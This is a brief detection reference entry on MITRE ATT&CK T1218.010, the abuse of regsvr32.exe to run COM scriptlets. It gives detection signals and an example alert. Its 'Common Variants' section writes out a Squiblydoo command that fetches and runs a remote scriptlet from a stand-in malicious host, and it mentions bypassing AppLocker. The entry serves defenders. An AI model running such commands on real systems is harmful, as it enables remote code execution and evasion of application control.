# T1218.010: Signed Binary Proxy Execution — Regsvr32

## Description
Adversaries may use regsvr32.exe to execute arbitrary code via COM scriptlets. Regsvr32 is a Microsoft-signed binary used to register DLLs as COM components. Attackers abuse it by loading a .sct (scriplet) file from a remote server, which executes script in the context of regsvr32.exe.

## Detection
- regsvr32.exe executed with `/s` (silent) or `/i` flags pointing to remote URLs
- regsvr32.exe spawning child processes like cmd.exe or powershell.exe
- Network connections from regsvr32.exe to external IPs
- Command line contains `regsvr32.exe /s /u /i:<URL> scrobj.dll`

## Common Variants
- `regsvr32.exe /s /u /i:http://malicious.example.com/script.sct scrobj.dll`
- `regsvr32.exe /s "C:\ProgramData\malicious.dll"`
- Squiblydoo technique using regsvr32 to bypass AppLocker

## Example
regsvr32.exe executed with /s flag to silently load fccomintdll.dll, a FortiClient DLL, from a non-standard path.

## MITRE Mapping
- **Tactic:** Execution, Defense Evasion
- **Platform:** Windows
- **Defense Bypass:** Application control bypass by using Microsoft-signed binary
